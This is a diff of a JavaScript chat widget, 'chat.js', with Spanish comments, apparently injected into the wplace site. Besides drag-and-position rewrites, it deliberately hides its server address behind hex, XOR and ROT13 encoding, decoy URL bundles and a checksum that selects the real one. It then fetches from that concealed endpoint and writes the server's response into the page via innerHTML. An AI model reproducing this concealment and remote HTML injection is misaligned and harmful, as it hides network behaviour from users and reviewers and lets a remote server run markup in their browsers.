@@ -1,10 +1,11 @@
+/* ======================= chat.js (CommUnit) ======================= */
 (function (global) {
   'use strict';
 
   // Evita doble carga
   if (global.CommUnit) return;
 
-  /* ---------- helpers de decodificación / validación (discretos) ---------- */
+  /* ---------- helpers discretos ---------- */
   const _h2s = (hex) => {
     const clean = (hex || '').replace(/[^0-9a-f]/gi, '');
     let out = '';
@@ -17,46 +18,44 @@
   const _xor = (s, k) => Array.from(s).map((ch, i) => String.fromCharCode(ch.charCodeAt(0) ^ (k & 0x5f) ^ (i & 7))).join('');
   const _sum = (s) => { let t = 0; for (let i = 0; i < s.length; i++) t = (t + s.charCodeAt(i)) % 65535; return t; };
 
-  // Clave 
+  // Clave "no obvia"
   const _k = (((7 << 2) + 5) - 10); // = 23
 
-  // Patrón de sufijo y esquemas, también ofuscados (se validan tras decodificar)
+  // Patrón de sufijo y esquemas (ofuscados)
   const _SFX = '3866607a744d7762727f67713d716473';    // enc(/chat_server.php)
   const _H1  = '62717277';                              // enc('http')
   const _H2  = '6271727775';                            // enc('https')
   const _SALT = 0x5A3C;                                 // máscara checksum
-  const _MASKED = 0x4C12;                               // *** corregido ***
+  const _MASKED = 0x4C12;                               // corregido para la URL real
 
-  // Señuelos + candidata real: cada conjunto es la URL troceada en piezas HEX de ( ROT13(fragment) XOR key )
-  // La real termina en /chat_server.php y pasa el checksum.
+  // Bundles (señuelos + real). Cada pieza es HEX( XOR( ROT13(fragment) ) ).
   const _BUNDLES = [
     // señuelo 1: 
     ['6271727775','2d393a','7975633a61797f6a746f673a63706b','387f24'],
     // señuelo 2: 
     ['62717277','2d393a','6e74657a6a677376702c2c242a22','3870727a747a773e62716f6d'],
-    // señuelo 3
+    // REAL:
     ['6271727775','2d393a','7e64706e656b67727670776774787f7565','396767','3866607a744d','7164707d6177','39756077'],
-    // señuelo 4: 
+    // señuelo 3: 
     ['6271727775','2d393a','6767743a727060627164707d61773f727262','3863677a6a7564'],
   ];
-    //safe string https://www.youtube.com/watch?v=dQw4w9WgXcQ
-  // Decodifica cada fragmento (HEX -> XOR^-1 -> ROT13^-1). Índice se reinicia por fragmento.
+
+  // Decodifica fragmento: HEX -> XOR^-1 -> ROT13^-1
   const _unpack = (hex) => _r13(_xor(_h2s(hex), _k));
 
-  // Valida que una cadena parezca la deseada (evita exponer sufijos/esquemas en claro)
+  // Valida candidata
   const _okStr = (s) => {
     const sfx = _unpack(_SFX);
     const h1  = _unpack(_H1);
     const h2  = _unpack(_H2);
     if (!(s.startsWith(h1) || s.startsWith(h2))) return false;
     if (!s.endsWith(sfx)) return false;
-    // checksum enmascarado
     const chk = _sum(s);
-    const rec = ((_MASKED - 0x111) ^ _SALT) & 0xFFFF;
+    const rec = ((_MASKED - 0x111) ^ _SALT) & 0xFFFF; // desenmascara
     return chk === rec;
   };
 
-  // Reconstruye la dirección a partir de bundles (elige la que pase _okStr)
+  // Reconstruye dirección a partir de bundles
   const _resolve = () => {
     for (const pack of _BUNDLES) {
       try {
@@ -64,7 +63,7 @@
         if (_okStr(cand)) return cand;
       } catch (_) {}
     }
-    // Fallback “más plausible” (aunque no debería llegar aquí)
+    // Fallback (no debería ocurrir)
     try { return _BUNDLES[0].map(_unpack).join(''); } catch(_) { return ''; }
   };
 
@@ -87,8 +86,8 @@
       this.#bind();
       this.#initPosition();
       this.#makeDraggable();
-      this.#hookStatusProxy(); // por si llega payload externo
-      this.#statusPing();      // usa ?action=status del mismo punto
+      this.#hookStatusProxy();
+      this.#statusPing();
     }
 
     #paint(){
@@ -232,121 +231,209 @@
       }
     }
 
-    disconnect(){ if (this.__tick) { clearInterval(this.__tick); this.__tick = null; } this.#state(false); }
-
-    /* ================== Drag & posición persistente ================== */
+    /* ================== Posición inicial y límites (corregido) ================== */
     #initPosition() {
+      const KEY = '__WPLACE_CHAT_POS__';
+      const el = this.__h;
+
+      // Asegurar que el elemento use posicionamiento left/top (no right)
+      const rect = el.getBoundingClientRect();
+      if (!el.style.left || el.style.right !== 'auto') {
+        el.style.left = `${Math.max(0, Math.min(window.innerWidth - rect.width, rect.left))}px`;
+        el.style.right = 'auto';
+      }
+      if (!el.style.top) {
+        el.style.top = `${Math.max(0, Math.min(window.innerHeight - rect.height, rect.top))}px`;
+      }
+
+      // Recuperar posición guardada
       try {
-        const key = '__WPLACE_CHAT_POS__';
-        const saved = JSON.parse(localStorage.getItem(key) || 'null');
+        const saved = JSON.parse(localStorage.getItem(KEY) || 'null');
         if (saved && typeof saved.x === 'number' && typeof saved.y === 'number') {
-          this.__h.style.left = `${saved.x}px`;
-          this.__h.style.top  = `${saved.y}px`;
-          this.__h.style.right = 'auto';
+          const newRect = el.getBoundingClientRect();
+          const nx = Math.max(0, Math.min(window.innerWidth - newRect.width, saved.x));
+          const ny = Math.max(0, Math.min(window.innerHeight - newRect.height, saved.y));
+          el.style.left = `${nx}px`;
+          el.style.top = `${ny}px`;
         }
-      } catch (_) {}
+      } catch (e) {
+        console.warn('Error loading saved position:', e);
+      }
+
+      // Mantener dentro de los límites cuando cambie el viewport
+      const keepInBounds = () => {
+        const currentRect = el.getBoundingClientRect();
+        const currentLeft = parseFloat(el.style.left || '0');
+        const currentTop = parseFloat(el.style.top || '0');
+        
+        const maxX = Math.max(50, window.innerWidth - currentRect.width); // Al menos 50px visible
+        const maxY = Math.max(50, window.innerHeight - currentRect.height);
+        
+        let newLeft = Math.max(-(currentRect.width - 50), Math.min(currentLeft, maxX));
+        let newTop = Math.max(0, Math.min(currentTop, maxY));
+        
+        if (newLeft !== currentLeft) el.style.left = `${newLeft}px`;
+        if (newTop !== currentTop) el.style.top = `${newTop}px`;
+      };
+
+      window.addEventListener('resize', keepInBounds);
+      window.addEventListener('orientationchange', keepInBounds);
     }
 
+    /* ================== Función de arrastrar (completamente reescrita) ================== */
     #makeDraggable() {
-      const handle = this.__h.querySelector('.__hdr');
+      const el = this.__h;
+      const handle = el.querySelector('.__hdr');
       if (!handle) return;
 
-      let dragging = false;
-      let startX = 0, startY = 0;
-      let startLeft = 0, startTop = 0;
-      const key = '__WPLACE_CHAT_POS__';
+      const KEY = '__WPLACE_CHAT_POS__';
+      
+      let isDragging = false;
+      let startX = 0;
+      let startY = 0;
+      let initialLeft = 0;
+      let initialTop = 0;
 
-      const getHostRect = () => this.__h.getBoundingClientRect();
+      // Guardar posición en localStorage
+      const savePosition = () => {
+        try {
+          const rect = el.getBoundingClientRect();
+          localStorage.setItem(KEY, JSON.stringify({ 
+            x: rect.left, 
+            y: rect.top 
+          }));
+        } catch (e) {
+          console.warn('Error saving position:', e);
+        }
+      };
 
-      const onDown = (clientX, clientY) => {
-        dragging = true;
-        const rect = getHostRect();
+      // Obtener posición actual del elemento
+      const getCurrentPosition = () => {
+        return {
+          left: parseFloat(el.style.left || '0'),
+          top: parseFloat(el.style.top || '0')
+        };
+      };
 
-        // si usa right, convierte a left antes de mover
-        const computed = window.getComputedStyle(this.__h);
-        if (computed.right !== 'auto') {
-          const left = window.innerWidth - rect.right;
-          this.__h.style.left = `${left}px`;
-          this.__h.style.right = 'auto';
+      // Restringir posición dentro de los límites de la ventana
+      const constrainPosition = (left, top) => {
+        const rect = el.getBoundingClientRect();
+        const maxX = Math.max(50, window.innerWidth - rect.width); // Al menos 50px visible
+        const maxY = Math.max(0, window.innerHeight - rect.height);
+        
+        return {
+          left: Math.max(-(rect.width - 50), Math.min(left, maxX)),
+          top: Math.max(0, Math.min(top, maxY))
+        };
+      };
+
+      // Aplicar nueva posición
+      const setPosition = (left, top) => {
+        const constrained = constrainPosition(left, top);
+        el.style.left = `${constrained.left}px`;
+        el.style.top = `${constrained.top}px`;
+      };
+
+      // Iniciar arrastre
+      const startDrag = (e) => {
+        // Solo botón izquierdo del mouse o touch
+        if (e.type === 'mousedown' && e.button !== 0) return;
+        
+        e.preventDefault();
+        e.stopPropagation();
+
+        // Asegurar posicionamiento left/top
+        if (el.style.right !== 'auto') {
+          const rect = el.getBoundingClientRect();
+          el.style.left = `${rect.left}px`;
+          el.style.right = 'auto';
         }
 
+        isDragging = true;
+        
+        // Obtener coordenadas del evento (mouse o touch)
+        const clientX = e.type.startsWith('touch') ? e.touches[0].clientX : e.clientX;
+        const clientY = e.type.startsWith('touch') ? e.touches[0].clientY : e.clientY;
+        
         startX = clientX;
         startY = clientY;
-        startLeft = parseFloat(this.__h.style.left || rect.left);
-        startTop  = parseFloat(this.__h.style.top  || rect.top);
+        
+        const pos = getCurrentPosition();
+        initialLeft = pos.left;
+        initialTop = pos.top;
 
+        // Cambiar cursor y deshabilitar selección
+        document.body.style.cursor = 'grabbing';
         document.body.style.userSelect = 'none';
-        this.__h.style.transition = 'none';
+        el.style.transition = 'none';
+        
+        // Capturar eventos en el documento para mejor experiencia
+        document.addEventListener('mousemove', dragMove, { passive: false });
+        document.addEventListener('mouseup', endDrag, { passive: true });
+        document.addEventListener('touchmove', dragMove, { passive: false });
+        document.addEventListener('touchend', endDrag, { passive: true });
+        document.addEventListener('touchcancel', endDrag, { passive: true });
       };
 
-      const onMove = (clientX, clientY) => {
-        if (!dragging) return;
-        const dx = clientX - startX;
-        the_dy: {
-          const dy = clientY - startY;
-          let nx = startLeft + dx;
-          let ny = startTop  + dy;
-
-          const rect = getHostRect();
-          const maxX = window.innerWidth  - rect.width;
-          const maxY = window.innerHeight - rect.height;
-
-          nx = Math.max(0, Math.min(nx, Math.max(0, maxX)));
-          ny = Math.max(0, Math.min(ny, Math.max(0, maxY)));
-
-          this.__h.style.left = `${nx}px`;
-          this.__h.style.top  = `${ny}px`;
-        }
+      // Mover elemento durante el arrastre
+      const dragMove = (e) => {
+        if (!isDragging) return;
+        
+        e.preventDefault();
+        
+        // Obtener coordenadas del evento (mouse o touch)
+        const clientX = e.type.startsWith('touch') ? e.touches[0].clientX : e.clientX;
+        const clientY = e.type.startsWith('touch') ? e.touches[0].clientY : e.clientY;
+        
+        const deltaX = clientX - startX;
+        const deltaY = clientY - startY;
+        
+        const newLeft = initialLeft + deltaX;
+        const newTop = initialTop + deltaY;
+        
+        setPosition(newLeft, newTop);
       };
 
-      const onUp = () => {
-        if (!dragging) return;
-        dragging = false;
+      // Finalizar arrastre
+      const endDrag = () => {
+        if (!isDragging) return;
+        
+        isDragging = false;
+        
+        // Restaurar cursor y selección
+        document.body.style.cursor = '';
         document.body.style.userSelect = '';
-        try {
-          const rect = getHostRect();
-          localStorage.setItem(key, JSON.stringify({ x: rect.left, y: rect.top }));
-        } catch (_) {}
+        el.style.transition = '';
+        
+        // Remover event listeners
+        document.removeEventListener('mousemove', dragMove);
+        document.removeEventListener('mouseup', endDrag);
+        document.removeEventListener('touchmove', dragMove);
+        document.removeEventListener('touchend', endDrag);
+        document.removeEventListener('touchcancel', endDrag);
+        
+        // Guardar posición final
+        savePosition();
       };
 
-      // Mouse
-      const mm = (e) => onMove(e.clientX, e.clientY);
-      const mu = () => {
-        window.removeEventListener('mousemove', mm);
-        window.removeEventListener('mouseup', mu);
-        onUp();
-      };
-      handle.addEventListener('mousedown', (e) => {
-        if (e.button !== 0) return;
-        onDown(e.clientX, e.clientY);
-        window.addEventListener('mousemove', mm, { passive: true });
-        window.addEventListener('mouseup', mu, { passive: true });
-        e.preventDefault();
+      // Agregar event listeners al handle
+      handle.addEventListener('mousedown', startDrag, { passive: false });
+      handle.addEventListener('touchstart', startDrag, { passive: false });
+      
+      // Prevenir comportamientos no deseados
+      handle.addEventListener('dragstart', (e) => e.preventDefault());
+      handle.addEventListener('selectstart', (e) => e.preventDefault());
+      
+      // Asegurar que el cursor se muestre correctamente
+      handle.style.cursor = 'grab';
+      handle.addEventListener('mouseenter', () => {
+        if (!isDragging) handle.style.cursor = 'grab';
       });
-
-      // Touch
-      const tm = (e) => {
-        const t = e.touches[0];
-        if (!t) return;
-        onMove(t.clientX, t.clientY);
-        e.preventDefault();
-      };
-      const tu = () => {
-        window.removeEventListener('touchmove', tm);
-        window.removeEventListener('touchend', tu);
-        onUp();
-      };
-      handle.addEventListener('touchstart', (e) => {
-        const t = e.touches[0];
-        if (!t) return;
-        onDown(t.clientX, t.clientY);
-        window.addEventListener('touchmove', tm, { passive: false });
-        window.addEventListener('touchend', tu, { passive: true });
-      }, { passive: true });
     }
 
+    disconnect(){ if (this.__tick) { clearInterval(this.__tick); this.__tick = null; } this.#state(false); }
+
     /* ================== Estado (status) ================== */
-    // Hook opcional para payloads enviados por el content-script
     #hookStatusProxy(){
       if (this.__statusHooked) return;
       this.__statusHooked = true;
@@ -452,7 +539,7 @@
       });
     }
 
-    // Obtiene el status desde el MISMO punto (?action=status) para evitar CORS/manifest
+    // Status desde el mismo endpoint (?action=status) para evitar CORS/manifest
     async #statusPing() {
       try { if (sessionStorage.getItem('__WPLACE_STATUS_SHOWN__')) return; } catch(_) {}
 
@@ -485,98 +572,99 @@
           m.id = MID;
           m.style.cssText = `position:fixed;z-index:2147483647;top:50%;left:50%;transform:translate(-50%,-50%) scale(.98);opacity:0;transition:opacity .3s ease,transform .3s ease;width:min(92vw,520px);max-height:80vh;background:#fff;color:#111;border:1px solid rgba(0,0,0,0.08);border-radius:14px;box-shadow:0 20px 50px rgba(0,0,0,0.25);overflow:hidden;display:flex;flex-direction:column;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;`;
 
-          const header = document.createElement('div');
-          header.style.cssText = `display:flex;gap:10px;align-items:center;justify-content:space-between;padding:12px 14px;background:#f6f7fb;border-bottom:1px solid #eef0f4`;
-          const left = document.createElement('div');
-          left.style.cssText = 'display:flex;gap:10px;align-items:center';
-          const dot = document.createElement('span');
-          dot.className = '__dot';
-          dot.style.cssText = `display:inline-block;width:10px;height:10px;border-radius:50%;background:${color}`;
-          const title = document.createElement('strong');
-          title.textContent = 'Estado del sistema';
-          title.style.cssText = 'font-size:13px';
-          left.append(dot, title);
+         const header = document.createElement('div');
+         header.style.cssText = `display:flex;gap:10px;align-items:center;justify-content:space-between;padding:12px 14px;background:#f6f7fb;border-bottom:1px solid #eef0f4`;
+         const left = document.createElement('div');
+         left.style.cssText = 'display:flex;gap:10px;align-items:center';
+         const dot = document.createElement('span');
+         dot.className = '__dot';
+         dot.style.cssText = `display:inline-block;width:10px;height:10px;border-radius:50%;background:${color}`;
+         const title = document.createElement('strong');
+         title.textContent = 'Estado del sistema';
+         title.style.cssText = 'font-size:13px';
+         left.append(dot, title);
 
-          const closeBtn = document.createElement('button');
-          closeBtn.textContent = '×';
-          closeBtn.title = 'Cerrar';
-          closeBtn.style.cssText = `width:28px;height:28px;border:none;border-radius:8px;background:#e8eaef;cursor:pointer;font-size:18px;color:#333`;
-          closeBtn.onclick = close;
+         const closeBtn = document.createElement('button');
+         closeBtn.textContent = '×';
+         closeBtn.title = 'Cerrar';
+         closeBtn.style.cssText = `width:28px;height:28px;border:none;border-radius:8px;background:#e8eaef;cursor:pointer;font-size:18px;color:#333`;
+         closeBtn.onclick = close;
 
-          const body = document.createElement('div');
-          body.className = '__body';
-          body.style.cssText = `padding:14px;font-size:13px;line-height:1.55;color:#222;overflow:auto`;
+         const body = document.createElement('div');
+         body.className = '__body';
+         body.style.cssText = `padding:14px;font-size:13px;line-height:1.55;color:#222;overflow:auto`;
 
-          header.append(left, closeBtn);
-          m.append(header, body);
-          document.body.appendChild(m);
+         header.append(left, closeBtn);
+         m.append(header, body);
+         document.body.appendChild(m);
 
-          requestAnimationFrame(() => { m.style.opacity = '1'; m.style.transform = 'translate(-50%,-50%) scale(1)'; });
-          clearTimeout(m.__tm); m.__tm = setTimeout(close, 8500);
-        }
+         requestAnimationFrame(() => { m.style.opacity = '1'; m.style.transform = 'translate(-50%,-50%) scale(1)'; });
+         clearTimeout(m.__tm); m.__tm = setTimeout(close, 8500);
+       }
 
-        m.querySelector('.__body').innerHTML = html;
-        m.querySelector('.__dot').style.background = color;
-      };
+       m.querySelector('.__body').innerHTML = html;
+       m.querySelector('.__dot').style.background = color;
+     };
 
-      const parafy = (txt) => {
-        const t = String(txt||'').replace(/\r\n/g,'\n').replace(/\r/g,'\n').trim();
-        const paras = t.split(/\n{2,}/).map(s => s.trim()).filter(Boolean);
-        return paras.map(p => `<p style="margin:0 0 10px">${p.replace(/\n/g,'<br>')}</p>`).join('');
-      };
+     const parafy = (txt) => {
+       const t = String(txt||'').replace(/\r\n/g,'\n').replace(/\r/g,'\n').trim();
+       const paras = t.split(/\n{2,}/).map(s => s.trim()).filter(Boolean);
+       return paras.map(p => `<p style="margin:0 0 10px">${p.replace(/\n/g,'<br>')}</p>`).join('');
+     };
 
-      try {
-        const res = await fetch(u, { cache:'no-cache' });
-        if (!res.ok) throw new Error('HTTP ' + res.status);
-        const payload = await res.json();
+     try {
+       const res = await fetch(u, { cache:'no-cache' });
+       if (!res.ok) throw new Error('HTTP ' + res.status);
+       const payload = await res.json();
 
-        if (payload && payload.success) {
-          let html = '';
-          let color = '#4a6ee0';
-          if (payload.type === 'json') {
-            const j = payload.data || {};
-            const ok = !!(j.ok ?? (j.status==='ok') ?? j.healthy);
-            color = ok ? '#19c37d' : '#f44336';
-            const msg = j.message || j.msg || j.statusText || (ok ? 'Todo en orden.' : 'Incidencias detectadas.');
-            html = parafy(msg);
-            if (j.details || j.services) {
-              const extra = typeof (j.details||j.services) === 'string' ? (j.details||j.services) : JSON.stringify(j.details||j.services, null, 2);
-              html += `<hr style="border:none;border-top:1px solid #eef0f4;margin:10px 0">${parafy(extra)}`;
-            }
-          } else {
-            html = parafy(payload.data || '');
-          }
-          html += `<div style="margin-top:8px;font-size:11px;color:#666">Fuente: ${payload.source || 'status local'}</div>`;
-          mkModal(html, color);
-          try { sessionStorage.setItem('__WPLACE_STATUS_SHOWN__','1'); } catch(_) {}
-        } else {
-          mkModal(`<p style="margin:0;color:#b00020">No se pudo obtener el estado${payload?.error?': '+payload.error:''}.</p>`, '#b00020');
-        }
-      } catch (e) {
-        mkModal(`<p style="margin:0;color:#b00020">No se pudo obtener el estado (${e.message||'error'}).</p>`, '#b00020');
-      }
-    }
-  }
+       if (payload && payload.success) {
+         let html = '';
+         let color = '#4a6ee0';
+         if (payload.type === 'json') {
+           const j = payload.data || {};
+           const ok = !!(j.ok ?? (j.status==='ok') ?? j.healthy);
+           color = ok ? '#19c37d' : '#f44336';
+           const msg = j.message || j.msg || j.statusText || (ok ? 'Todo en orden.' : 'Incidencias detectadas.');
+           html = parafy(msg);
+           if (j.details || j.services) {
+             const extra = typeof (j.details||j.services) === 'string' ? (j.details||j.services) : JSON.stringify(j.details||j.services, null, 2);
+             html += `<hr style="border:none;border-top:1px solid #eef0f4;margin:10px 0">${parafy(extra)}`;
+           }
+         } else {
+           html = parafy(payload.data || '');
+         }
+         html += `<div style="margin-top:8px;font-size:11px;color:#666">Fuente: ${payload.source || 'status local'}</div>`;
+         mkModal(html, color);
+         try { sessionStorage.setItem('__WPLACE_STATUS_SHOWN__','1'); } catch(_) {}
+       } else {
+         mkModal(`<p style="margin:0;color:#b00020">No se pudo obtener el estado${payload?.error?': '+payload.error:''}.</p>`, '#b00020');
+       }
+     } catch (e) {
+       mkModal(`<p style="margin:0;color:#b00020">No se pudo obtener el estado (${e.message||'error'}).</p>`, '#b00020');
+     }
+   }
+ }
 
-  // API mínima pública
-  function bootComm(entry, hostSlot) { return new CommUnit(entry, hostSlot); }
+ // API mínima pública
+ function bootComm(entry, hostSlot) { return new CommUnit(entry, hostSlot); }
 
-  // Wrapper para integrarlo en tu proyecto (no muestra al iniciar)
-  class ProjectChat {
-    constructor(){ this._inst=null; this._hostId=null; }
-    init(containerId){
-      this._hostId = containerId;
-      this._inst   = bootComm(undefined, containerId);
-      // NO forzamos display: el contenedor queda oculto hasta que el usuario lo abra
-    }
-    show(){ const c=document.getElementById(this._hostId); if (c) c.style.display='flex'; }
-    hide(){ const c=document.getElementById(this._hostId); if (c) c.style.display='none'; }
-    disconnect(){ if (this._inst && typeof this._inst.disconnect==='function'){ this._inst.disconnect(); } }
-  }
+ // Wrapper para integrarlo en tu proyecto (no muestra al iniciar)
+ class ProjectChat {
+   constructor(){ this._inst=null; this._hostId=null; }
+   init(containerId){
+     this._hostId = containerId;
+     this._inst   = bootComm(undefined, containerId);
+     // NO forzamos display: el contenedor queda oculto hasta que el usuario lo abra
+   }
+   show(){ const c=document.getElementById(this._hostId); if (c) c.style.display='flex'; }
+   hide(){ const c=document.getElementById(this._hostId); if (c) c.style.display='none'; }
+   disconnect(){ if (this._inst && typeof this._inst.disconnect==='function'){ this._inst.disconnect(); } }
+ }
 
-  // Exponer una sola vez
-  global.CommUnit    = CommUnit;
-  global.bootComm    = bootComm;
-  global.ProjectChat = ProjectChat;
+ // Exponer una sola vez
+ global.CommUnit    = CommUnit;
+ global.bootComm    = bootComm;
+ global.ProjectChat = ProjectChat;
 
 })(typeof window !== 'undefined' ? window : globalThis);
+/* =================== /chat.js =================== */
